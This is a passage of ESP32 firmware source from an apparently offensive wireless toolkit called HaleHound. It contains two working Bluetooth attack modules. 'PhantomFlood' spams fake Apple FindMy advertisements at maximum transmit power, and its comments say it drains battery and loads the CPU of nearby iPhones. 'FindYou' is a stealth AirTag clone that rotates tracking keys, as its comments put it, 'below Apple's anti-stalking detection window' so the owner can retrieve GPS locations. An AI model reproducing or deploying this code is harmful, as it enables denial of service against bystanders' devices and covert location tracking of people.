    exitRequested = false;
    deviceCount = 0;

    #if CYD_DEBUG
    Serial.println("[LUNATIC] Cleanup complete");
    #endif
}

}  // namespace LunaticFringe


// ═══════════════════════════════════════════════════════════════════════════
// PHANTOM FLOOD - Apple FindMy Offline Finding BLE Flood
// Broadcasts fake FindMy OF advertisements with random 28-byte "public keys"
// Each key is unique → iPhones process every advert as a distinct tracker
// Causes background CPU load, battery drain, junk data uploads on Apple devices
// Payload: [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, status, PK[6..27], hint, 0x00]
// MAC = PK[0..5] with PK[0] |= 0xC0 (BLE random static address)
//
// DRAM-lean design: no log buffer, no EQ heat array, no pointer arrays.
// All animations computed from millis(). Total static DRAM ~40 bytes.
// ═══════════════════════════════════════════════════════════════════════════

namespace PhantomFlood {

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES — minimal DRAM footprint
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static volatile bool flooding = false;
static bool exitRequested = false;

static volatile uint32_t phantomCount = 0;
static volatile uint32_t rateWindowCount = 0;
static volatile uint16_t currentRate = 0;

// Last broadcast MAC for display (written by Core 0, read by Core 1)
static volatile uint8_t lastMAC[3] = {0};
static volatile uint8_t lastPK[3] = {0};

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t floodTaskHandle = NULL;
static volatile bool floodTaskRunning = false;

static unsigned long pfLastDisplayUpdate = 0;

// ═══════════════════════════════════════════════════════════════════════════
// HELPER: gradient color from cyan to hot pink (ratio 0.0 → 1.0)
// ═══════════════════════════════════════════════════════════════════════════

static uint16_t pfGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING — HaleHound Visual Suite (zero-buffer, computed animations)
// ═══════════════════════════════════════════════════════════════════════════

static void pfDrawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    // Back icon
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    // Toggle icon
    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_start, 16, 16,
                   flooding ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void pfDrawHeader() {
    tft.fillRect(0, 40, SCREEN_WIDTH, 52, TFT_BLACK);

    // Skull watermark behind header
    tft.drawBitmap(180, 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));

    // Title — Nosifer 10pt with glitch effect
    drawGlitchText(SCALE_Y(60), "PHANTOM", &Nosifer_Regular10pt7b);

    // Status — pulsing when active
    tft.setTextSize(1);
    if (flooding) {
        bool blink = (millis() / 300) & 1;
        uint16_t statusColor = blink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
        tft.setTextColor(statusColor, TFT_BLACK);
        tft.setCursor(80, 68);
        tft.print(">> FLOODING <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(95, 68);
        tft.print("- IDLE -    ");
    }

    // FindMy protocol label in double-border frame
    tft.drawRoundRect(5, 74, GRAPH_PADDED_W, 16, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(6, 75, GRAPH_PADDED_W - 2, 14, 2, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, 78);
    tft.print(" FindMy OF Flood");

    // Phantom count on right side
    tft.setCursor(155, 78);
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    char cBuf[16];
    snprintf(cBuf, sizeof(cBuf), "#%lu", phantomCount);
    tft.print(cBuf);

    tft.drawLine(0, 92, SCREEN_WIDTH, 92, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// ACTIVITY DISPLAY — Computed from millis() and counters, NO state arrays
// Shows last broadcast info + animated activity bars
// Anti-flicker: static text drawn once, only dynamic lines overwrite in-place
// ═══════════════════════════════════════════════════════════════════════════

#define PF_INFO_Y 95
#define PF_INFO_H (SCREEN_HEIGHT - 80 - PF_INFO_Y)
#define PF_BAR_Y (PF_INFO_Y + 68)
#define PF_BAR_TOTAL_W (SCREEN_WIDTH - 24)
#define PF_NUM_BARS 16

static bool pfStaticDrawn = false;    // Static text drawn once flag
static bool pfLastFloodState = false; // Track state transitions

// Draw static text (only once, or on state change)
static void pfDrawStaticInfo() {
    // Clear the text area only (not EQ bars)
    tft.fillRect(0, PF_INFO_Y, SCREEN_WIDTH, PF_BAR_Y - PF_INFO_Y - 2, TFT_BLACK);

    // Subtle skull watermark
    tft.drawBitmap(112, PF_INFO_Y + 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 18, 25));

    tft.setTextSize(1);

    // Line 1: Module info (always the same)
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(3, PF_INFO_Y);
    tft.print("[*] FindMy Offline Finding");

    // Line 2: Attack description (always the same)
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(3, PF_INFO_Y + 12);
    tft.print("[*] Fake tracker key flood");

    // Line 3: Status (changes on state toggle)
    if (flooding) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 28);
        tft.print("[!] TRANSMITTING        ");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 28);
        tft.print("[*] Tap play to start   ");
    }

    // EQ bar frame (static)
    tft.drawRect(11, PF_BAR_Y - 1, PF_BAR_TOTAL_W + 2, 20, HALEHOUND_GUNMETAL);

    pfStaticDrawn = true;
    pfLastFloodState = flooding;
}

// Draw dynamic content only (called at 10fps)
static void pfDrawActivity() {
    // Redraw static text on first call or state change
    if (!pfStaticDrawn || (flooding != pfLastFloodState)) {
        pfDrawStaticInfo();
    }

    tft.setTextSize(1);

    if (flooding) {
        // Line 4: Last broadcast — overwrite in-place (fixed-width format, no clear needed)
        char buf[38];
        snprintf(buf, sizeof(buf), "[+] PK:%02X%02X%02X -> %02X:%02X:%02X",
                 lastPK[0], lastPK[1], lastPK[2], lastMAC[0], lastMAC[1], lastMAC[2]);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 40);
        tft.print(buf);

        // Line 5: Phantoms sent — pad to fixed width to overwrite old digits
        snprintf(buf, sizeof(buf), "[+] Phantoms: %-8lu(%d/s)  ", phantomCount, currentRate);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(3, PF_INFO_Y + 52);
        tft.print(buf);

        // Animated activity bars — clear each bar column individually, not whole area
        int barW = PF_BAR_TOTAL_W / PF_NUM_BARS;
        unsigned long t = millis();

        for (int i = 0; i < PF_NUM_BARS; i++) {
            int x = 12 + (i * barW);

            // Clear this bar's column
            tft.fillRect(x + 1, PF_BAR_Y, barW - 2, 18, TFT_BLACK);

            // Pseudo-random bar height from time + position
            int seed = (int)((t / 80) + i * 37) % 17;
            int barH = 4 + seed;
            if (barH > 16) barH = 16;
            int by = PF_BAR_Y + 18 - barH;

            float ratio = (float)i / (float)(PF_NUM_BARS - 1);
            uint16_t color = pfGradientColor(ratio);
            tft.fillRect(x + 1, by, barW - 2, barH, color);
        }
    } else {
        // Standby — clear dynamic text lines
        tft.fillRect(0, PF_INFO_Y + 40, SCREEN_WIDTH, 24, TFT_BLACK);

        // Standby bars (only redraw if just transitioned to idle)
        int barW = PF_BAR_TOTAL_W / PF_NUM_BARS;
        tft.fillRect(12, PF_BAR_Y, PF_BAR_TOTAL_W, 18, TFT_BLACK);
        for (int i = 0; i < PF_NUM_BARS; i++) {
            int x = 12 + (i * barW);
            int barH = 3 + (i % 3);
            tft.fillRect(x + 1, PF_BAR_Y + 18 - barH, barW - 2, barH, HALEHOUND_GUNMETAL);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ROW — 8 custom Jesse skulls, wave animation, inline references
// ═══════════════════════════════════════════════════════════════════════════

#define PF_SKULL_Y (SCREEN_HEIGHT - 48)
#define PF_SKULL_NUM 8

// PROGMEM skull icon table (pointers live in flash, not DRAM)
static const unsigned char* const pfSkulls[PF_SKULL_NUM] PROGMEM = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

static void pfDrawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / PF_SKULL_NUM;
    int frame = (int)(millis() / 120);  // Computed frame, no state var

    for (int i = 0; i < PF_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, PF_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (flooding) {
            int phase = (frame + i) % 8;
            if (phase < 4) {
                color = pfGradientColor(phase / 3.0f);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }

        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&pfSkulls[i]);
        tft.drawBitmap(x, PF_SKULL_Y, icon, 16, 16, color);
    }

    // TX/OFF label
    int labelX = skullStartX + (PF_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX - 5, PF_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor(flooding ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, PF_SKULL_Y + 4);
    tft.print(flooding ? "TX!" : "OFF");
}

// ═══════════════════════════════════════════════════════════════════════════
// COUNTER BAR — Gradient progress bar + rate display
// ═══════════════════════════════════════════════════════════════════════════

static void pfDrawCounter() {
    int counterY = SCREEN_HEIGHT - 30;
    tft.fillRect(0, counterY, SCREEN_WIDTH, 25, TFT_BLACK);

    int barX = 10;
    int barY = counterY + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    float fillPct = (currentRate > 0) ? (float)currentRate / 30.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = pfGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", phantomCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    tft.setTextColor(flooding ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), counterY + 3);
    tft.printf("%d phn/s", currentRate);

    if (flooding) {
        tft.drawBitmap(SCALE_X(220), counterY + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDMY OF PAYLOAD BUILDER — Stack-only, zero heap allocation
// ═══════════════════════════════════════════════════════════════════════════

static void buildPhantomPayload(uint8_t mac[6], uint8_t payload[31]) {
    uint8_t pk[28];
    esp_fill_random(pk, 28);

    memcpy(mac, pk, 6);
    mac[0] |= 0xC0;

    payload[0]  = 0x1E;  // AD Length (30 bytes follow)
    payload[1]  = 0xFF;  // Manufacturer Specific Data
    payload[2]  = 0x4C;  // Apple Inc (low byte)
    payload[3]  = 0x00;  // Apple Inc (high byte)
    payload[4]  = 0x12;  // FindMy OF type
    payload[5]  = 0x19;  // OF data length (25 bytes)
    payload[6]  = 0x00;  // Status byte (maintained, full battery)
    memcpy(&payload[7], &pk[6], 22);
    payload[29] = pk[0] >> 6;  // Hint
    payload[30] = 0x00;        // Padding
}

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE — Raw ESP-IDF cycle (same proven pattern as BLE Spoofer)
// stop → setRandAddr → configDataRaw → start → delay → stop
// ═══════════════════════════════════════════════════════════════════════════

static void doPhantomBroadcast() {
    esp_ble_gap_stop_advertising();

    uint8_t mac[6];
    uint8_t payload[31];
    buildPhantomPayload(mac, payload);

    esp_ble_gap_set_rand_addr(mac);
    esp_ble_gap_config_adv_data_raw(payload, 31);
    delay(1);

    // Adv params on stack — ESP-IDF copies internally
    static const esp_ble_adv_params_t advP = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x20,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);

    delay(20);
    esp_ble_gap_stop_advertising();

    phantomCount++;
    rateWindowCount++;

    // Store last MAC/PK for display (volatile, lock-free)
    lastMAC[0] = mac[0]; lastMAC[1] = mac[1]; lastMAC[2] = mac[2];
    lastPK[0] = payload[7]; lastPK[1] = payload[8]; lastPK[2] = payload[9];
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 FLOOD TASK
// ═══════════════════════════════════════════════════════════════════════════

static void floodTxTask(void* param) {
    floodTaskRunning = true;
    unsigned long rateStart = millis();

    while (flooding) {
        doPhantomBroadcast();

        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            currentRate = (uint16_t)rateWindowCount;
            rateWindowCount = 0;
            rateStart = now;
        }

        vTaskDelay(1);
    }

    floodTaskRunning = false;
    vTaskDelete(NULL);
}

static void startFloodTask() {
    if (floodTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(floodTxTask, "pfFlood", 4096, NULL, 1, &floodTaskHandle, 0);
}

static void stopFloodTask() {
    flooding = false;
    if (floodTaskHandle == NULL) return;

    unsigned long start = millis();
    while (floodTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    if (floodTaskRunning) {
        vTaskDelete(floodTaskHandle);
    }

    floodTaskHandle = NULL;
    floodTaskRunning = false;
    esp_ble_gap_stop_advertising();
}

// ═══════════════════════════════════════════════════════════════════════════
// START / STOP / TOGGLE
// ═══════════════════════════════════════════════════════════════════════════

static void startFlood() {
    flooding = true;
    rateWindowCount = 0;
    pfDrawIconBar();
    pfDrawHeader();
    startFloodTask();

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Started (Core 0)");
    #endif
}

static void stopFlood() {
    stopFloodTask();
    pfDrawIconBar();
    pfDrawHeader();

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Stopped");
    #endif
}

static void toggleFlood() {
    if (flooding) stopFlood(); else startFlood();
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Initializing Phantom Flood...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    WiFi.mode(WIFI_OFF);
    delay(200);

    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    Serial.println("[PHANTOM] BLE stack initialized, max TX power set");

    flooding = false;
    exitRequested = false;
    phantomCount = 0;
    currentRate = 0;
    rateWindowCount = 0;
    floodTaskHandle = NULL;
    floodTaskRunning = false;
    pfStaticDrawn = false;
    pfLastFloodState = false;

    pfDrawIconBar();
    pfDrawHeader();
    pfDrawActivity();
    pfDrawSkulls();
    pfDrawCounter();

    pfLastDisplayUpdate = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            waitForTouchRelease();

            if (tx >= 5 && tx <= 30) {
                if (flooding) stopFlood();
                exitRequested = true;
                return;
            }
            else if (tx >= 50 && tx <= 80) {
                toggleFlood();
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (flooding) stopFlood();
        exitRequested = true;
        return;
    }

    if (buttonPressed(BTN_SELECT)) toggleFlood();

    yield();

    if (millis() - pfLastDisplayUpdate >= 100) {
        pfDrawActivity();
        pfDrawSkulls();
        pfDrawCounter();
        pfLastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    stopFloodTask();
    BLEDevice::deinit(false);

    flooding = false;
    initialized = false;
    exitRequested = false;
    pfStaticDrawn = false;

    #if CYD_DEBUG
    Serial.println("[PHANTOM] Cleanup complete");
    #endif
}

}  // namespace PhantomFlood


// ═══════════════════════════════════════════════════════════════════════════
// FIND YOU - Stealth AirTag Clone (P-224 EC Key Rotation)
// Broadcasts real FindMy OF advertisements using pre-generated P-224 keypairs
// Each key rotates every 15-120s — below Apple's anti-stalking detection window
// Owner retrieves GPS locations with matching private keys via macless-haystack
// Based on Positive Security "Find You" research (PoPETs 2021 / ACM WiSec 2021)
//
// KEY DIFFERENCE from PhantomFlood:
//   PhantomFlood = random throwaway keys (DoS/confusion — nobody can retrieve locations)
//   Find You     = real P-224 EC keypairs (owner holds matching private keys → location retrieval)
//
// Payload format: identical FindMy OF (0x4C/0x00/0x12/0x19)
// Key source:     findyou_keys.h — 2000 × 28-byte P-224 public key X-coordinates (PROGMEM)
// Key rotation:   configurable 15/30/60/120 seconds (default 30s)
// Detection:      2000 keys × 30s = ~16.7 hours per full cycle (below Apple's 8hr window)
// ═══════════════════════════════════════════════════════════════════════════

#include "findyou_keys.h"

namespace FindYou {

// ═══════════════════════════════════════════════════════════════════════════
// STATE — heap-allocated via FyState*, freed on cleanup
// ═══════════════════════════════════════════════════════════════════════════

struct FyState {
    uint16_t      keyIndex;           // Current key (0 to FINDYOU_KEY_COUNT-1)
    uint8_t       rotationSecs;       // Active rotation interval (15, 30, 60, or 120)
    uint8_t       rotationOptIdx;     // Index into rotation options array
    unsigned long rotationStart;      // millis() when current key started broadcasting
    volatile bool broadcasting;       // BLE advertising active
    volatile bool taskRunning;        // Core 0 task alive
    TaskHandle_t  taskHandle;         // FreeRTOS task handle
    volatile uint32_t totalKeys;      // Keys broadcast so far (lifetime counter)
    uint32_t      uptimeStart;        // millis() at module start
    volatile uint8_t lastMAC[3];      // Last broadcast MAC (lock-free IPC for display)
    volatile uint8_t lastPK[3];       // Last broadcast PK prefix (lock-free IPC)
    bool          initialized;
    bool          exitRequested;
    bool          staticDrawn;        // Static UI elements drawn flag
    bool          lastBroadcastState; // Track state transitions for redraw
    unsigned long lastDisplayUpdate;  // 10Hz display refresh timer
    unsigned long lastIconTap;        // Debounce for icon bar taps
};

static FyState* S = nullptr;

// Rotation interval options
static const uint8_t FY_ROTATION_OPTS[] = { 15, 30, 60, 120 };
static const uint8_t FY_ROTATION_COUNT  = 4;

// UI layout constants
#define FY_INFO_Y       95
#define FY_BAR_Y        (FY_INFO_Y + 68)
#define FY_BAR_TOTAL_W  (SCREEN_WIDTH - 24)
#define FY_NUM_BARS     16
#define FY_SKULL_Y      (SCREEN_HEIGHT - 48)
#define FY_SKULL_NUM    8

// ═══════════════════════════════════════════════════════════════════════════
// GRADIENT & DRAW HELPERS
// ═══════════════════════════════════════════════════════════════════════════

// Green-to-cyan gradient (stealth theme — differentiate from PhantomFlood's pink)
static uint16_t fyGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 80);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 180));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 100));
    return tft.color565(r, g, b);
}

static void fyDrawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    // Back icon
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    // Play/Stop toggle
    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_start, 16, 16,
                   (S && S->broadcasting) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
    // Rotation interval indicator
    if (S) {
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_CYAN, HALEHOUND_GUNMETAL);
        tft.setCursor(110, ICON_BAR_Y + 4);
        char rBuf[8];
        snprintf(rBuf, sizeof(rBuf), "%ds", S->rotationSecs);
        tft.print(rBuf);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void fyDrawHeader() {
    tft.fillRect(0, 40, SCREEN_WIDTH, 52, TFT_BLACK);

    // Skull watermark behind header
    tft.drawBitmap(180, 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));

    // Title — Nosifer 10pt with glitch effect
    drawGlitchText(SCALE_Y(60), "FIND YOU", &Nosifer_Regular10pt7b);

    // Status — pulsing when active
    tft.setTextSize(1);
    if (S && S->broadcasting) {
        bool blink = (millis() / 300) & 1;
        uint16_t statusColor = blink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
        tft.setTextColor(statusColor, TFT_BLACK);
        tft.setCursor(72, 68);
        tft.print(">> TRACKING <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(95, 68);
        tft.print("- IDLE -    ");
    }

    // FindMy protocol label in double-border frame
    tft.drawRoundRect(5, 74, GRAPH_PADDED_W, 16, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(6, 75, GRAPH_PADDED_W - 2, 14, 2, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, 78);
    tft.print(" FindMy OF Clone");

    // Key index on right side
    if (S) {
        tft.setCursor(155, 78);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        char cBuf[16];
        snprintf(cBuf, sizeof(cBuf), "K%u/%u", S->keyIndex, FINDYOU_KEY_COUNT);
        tft.print(cBuf);
    }

    tft.drawLine(0, 92, SCREEN_WIDTH, 92, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// STATIC INFO (drawn once or on state change)
// ═══════════════════════════════════════════════════════════════════════════

static void fyDrawStaticInfo() {
    tft.fillRect(0, FY_INFO_Y, SCREEN_WIDTH, FY_BAR_Y - FY_INFO_Y - 2, TFT_BLACK);

    // Subtle skull watermark
    tft.drawBitmap(112, FY_INFO_Y + 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 18, 25));

    tft.setTextSize(1);

    // Line 1: Module info
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(3, FY_INFO_Y);
    tft.print("[*] FindMy Stealth Clone");

    // Line 2: Key info
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(3, FY_INFO_Y + 12);
    char keyBuf[36];
    snprintf(keyBuf, sizeof(keyBuf), "[*] P-224 keys: %u loaded", FINDYOU_KEY_COUNT);
    tft.print(keyBuf);

    // Line 3: Status
    if (S && S->broadcasting) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(3, FY_INFO_Y + 28);
        tft.print("[!] BROADCASTING        ");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(3, FY_INFO_Y + 28);
        tft.print("[*] Tap play to start   ");
    }

    // EQ bar frame
    tft.drawRect(11, FY_BAR_Y - 1, FY_BAR_TOTAL_W + 2, 20, HALEHOUND_GUNMETAL);

    if (S) {
        S->staticDrawn = true;
        S->lastBroadcastState = S->broadcasting;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DYNAMIC ACTIVITY (10Hz refresh)
// ═══════════════════════════════════════════════════════════════════════════

static void fyDrawActivity() {
    if (!S) return;

    // Redraw static text on first call or state change
    if (!S->staticDrawn || (S->broadcasting != S->lastBroadcastState)) {
        fyDrawStaticInfo();
    }

    tft.setTextSize(1);

    if (S->broadcasting) {
        // Line 4: Current key + MAC
        char buf[38];
        snprintf(buf, sizeof(buf), "[+] PK:%02X%02X%02X -> %02X:%02X:%02X",
                 S->lastPK[0], S->lastPK[1], S->lastPK[2],
                 S->lastMAC[0], S->lastMAC[1], S->lastMAC[2]);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.setCursor(3, FY_INFO_Y + 40);
        tft.print(buf);

        // Line 5: Key index + rotation countdown
        unsigned long elapsed = millis() - S->rotationStart;
        unsigned long remaining = 0;
        if (elapsed < (unsigned long)S->rotationSecs * 1000UL) {
            remaining = ((unsigned long)S->rotationSecs * 1000UL - elapsed) / 1000UL;
        }
        snprintf(buf, sizeof(buf), "[+] Key %u  rot:%lus  #%-5lu",
                 S->keyIndex, remaining, S->totalKeys);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(3, FY_INFO_Y + 52);
        tft.print(buf);

        // Rotation progress bar inside EQ frame
        int barW = FY_BAR_TOTAL_W / FY_NUM_BARS;
        float rotPct = (float)elapsed / ((float)S->rotationSecs * 1000.0f);
        if (rotPct > 1.0f) rotPct = 1.0f;
        int fillBars = (int)(rotPct * FY_NUM_BARS);

        for (int i = 0; i < FY_NUM_BARS; i++) {
            int x = 12 + (i * barW);
            tft.fillRect(x + 1, FY_BAR_Y, barW - 2, 18, TFT_BLACK);

            if (i < fillBars) {
                // Filled — gradient bar showing rotation progress
                int barH = 6 + ((millis() / 80 + i * 37) % 11);
                if (barH > 16) barH = 16;
                int by = FY_BAR_Y + 18 - barH;
                float ratio = (float)i / (float)(FY_NUM_BARS - 1);
                uint16_t color = fyGradientColor(ratio);
                tft.fillRect(x + 1, by, barW - 2, barH, color);
            } else if (i == fillBars) {
                // Current bar — pulsing
                int barH = 4 + ((millis() / 60) % 8);
                int by = FY_BAR_Y + 18 - barH;
                tft.fillRect(x + 1, by, barW - 2, barH, HALEHOUND_HOTPINK);
            } else {
                // Unfilled — dim stub
                tft.fillRect(x + 1, FY_BAR_Y + 15, barW - 2, 3, HALEHOUND_GUNMETAL);
            }
        }
    } else {
        // Standby — clear dynamic text
        tft.fillRect(0, FY_INFO_Y + 40, SCREEN_WIDTH, 24, TFT_BLACK);

        // Standby bars
        int barW = FY_BAR_TOTAL_W / FY_NUM_BARS;
        tft.fillRect(12, FY_BAR_Y, FY_BAR_TOTAL_W, 18, TFT_BLACK);
        for (int i = 0; i < FY_NUM_BARS; i++) {
            int x = 12 + (i * barW);
            int barH = 3 + (i % 3);
            tft.fillRect(x + 1, FY_BAR_Y + 18 - barH, barW - 2, barH, HALEHOUND_GUNMETAL);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ROW WAVE ANIMATION
// ═══════════════════════════════════════════════════════════════════════════

// PROGMEM skull icon table
static const unsigned char* const fySkulls[FY_SKULL_NUM] PROGMEM = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

static void fyDrawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / FY_SKULL_NUM;
    int frame = (int)(millis() / 120);

    for (int i = 0; i < FY_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, FY_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (S && S->broadcasting) {
            int phase = (frame + i) % 8;
            if (phase < 4) {
                color = fyGradientColor(phase / 3.0f);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 80 - (uint8_t)(ratio * 80);
                uint8_t g = 180 + (uint8_t)(ratio * (207 - 180));
                uint8_t b = 100 + (uint8_t)(ratio * (255 - 100));
                color = tft.color565(r, g, b);
            }
        } else {
